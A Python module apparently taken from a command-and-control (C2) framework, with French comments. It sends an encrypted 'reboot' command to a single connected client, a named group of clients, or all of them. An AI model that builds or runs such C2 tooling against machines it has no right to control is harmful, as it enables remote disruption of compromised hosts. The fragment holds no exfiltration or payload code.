from tools.c2.utils.constant import _color
from utils.utils import _print_status, _find_client_by_ip
from tools.c2.core.chacha20 import crypt

# ==== Send Reboot ==== #
def _send_reboot(c2, client_address):
    encrypted_message = crypt("reboot".encode())
    c2.clients[client_address].send(encrypted_message)
    _print_status(f"Commande de reboot envoyée à {client_address}", "BLUE", "🔄")

# ==== Reboot System ==== #
def reboot(c2, target=None, mode="single"):
    """
    Reboot un ou plusieurs clients.
    
    - mode='single'  : cible est une adresse IP d'un client.
    - mode='group'   : cible est le nom d'un groupe.
    - mode='all'     : cible est ignorée, tous les clients seront reboot.

    uasage:

        reboot(c2, "192.168.1.42", mode="single")
        reboot(c2, "groupe_temp_capteurs", mode="group")
        reboot(c2, mode="all")
    """
    clients_to_reboot = []

    if mode == "single":
        if target in c2.clients:
            clients_to_reboot.append(target)
        else:
            _print_status(f"Client {target} not found", "RED", "⚠")
            return

    elif mode == "group":
        if target in c2.groups:
            for ip_address in c2.groups[target]:
                client_address = _find_client_by_ip(c2, ip_address)
                if client_address and client_address in c2.clients:
                    clients_to_reboot.append(client_address)
        else:
            _print_status(f"Group {target} not found", "RED", "⚠")
            return

    elif mode == "all":
        if not c2.clients:
            _print_status("No client connected", "RED", "⚠")
            return
        clients_to_reboot = list(c2.clients.keys())

    else:
        _print_status("Invalide reboot mode", "RED", "⚠")
        return

    for client_address in clients_to_reboot:
        try:
            _send_reboot(c2, client_address)
            del c2.clients[client_address]
            _print_status(f"Client {client_address} disconnected after reboot", "RED", "-")
        except:
            _print_status(f"Error during reboot of {client_address}", "RED", "⚠")
